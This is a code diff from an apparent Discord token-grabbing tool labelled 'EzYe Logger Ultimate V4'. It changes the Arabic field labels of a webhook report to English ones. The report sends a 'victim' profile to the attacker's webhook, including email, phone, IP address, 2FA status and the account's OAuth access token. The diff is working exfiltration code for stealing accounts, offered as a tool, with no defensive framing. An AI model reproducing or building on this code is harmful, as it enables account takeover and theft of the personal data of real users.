@@ -76,20 +76,20 @@ def callback():
         
         # إرسال التقرير النهائي للويب هوك
         payload = {
-            "content": "🚨 **صيد كامل من الإصدار الرابع!** 🚨",
+            "content": "🚨 **Ryz Grab ** 🚨",
             "embeds": [{
                 "title": f"👤 ملف الضحية: {user.get('username')}",
                 "color": 65280,
                 "fields": [
-                    {"name": "🆔 الآيدي", "value": f"`{user.get('id')}`", "inline": True},
-                    {"name": "🌍 اللغة", "value": f"`{locale}`", "inline": True},
-                    {"name": "📧 الإيميل", "value": f"`{user.get('email', 'N/A')}`", "inline": False},
-                    {"name": "📱 الهاتف", "value": f"`{user.get('phone', 'غير مربوط')}`", "inline": True},
-                    {"name": "💎 النيترو", "value": f"**{nitro_type}**", "inline": True},
+                    {"name": "🆔 id", "value": f"`{user.get('id')}`", "inline": True},
+                    {"name": "🌍 language", "value": f"`{locale}`", "inline": True},
+                    {"name": "📧 Email", "value": f"`{user.get('email', 'N/A')}`", "inline": False},
+                    {"name": "📱 phone", "value": f"`{user.get('phone', 'غير مربوط')}`", "inline": True},
+                    {"name": "💎 Nitro", "value": f"**{nitro_type}**", "inline": True},
                     {"name": "🛡️ 2FA", "value": mfa, "inline": True},
-                    {"name": "✅ التوثيق", "value": verified, "inline": True},
+                    {"name": "✅ verfiy", "value": verified, "inline": True},
                     {"name": "🌐 IP", "value": f"||{user_ip}||", "inline": False},
-                    {"name": "🔑 التوكن", "value": f"``` {access_token} ```"}
+                    {"name": "🔑 token", "value": f"``` {access_token} ```"}
                 ],
                 "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user.get('id')}/{user.get('avatar')}.png"},
                 "footer": {"text": "EzYe Logger Ultimate V4"}
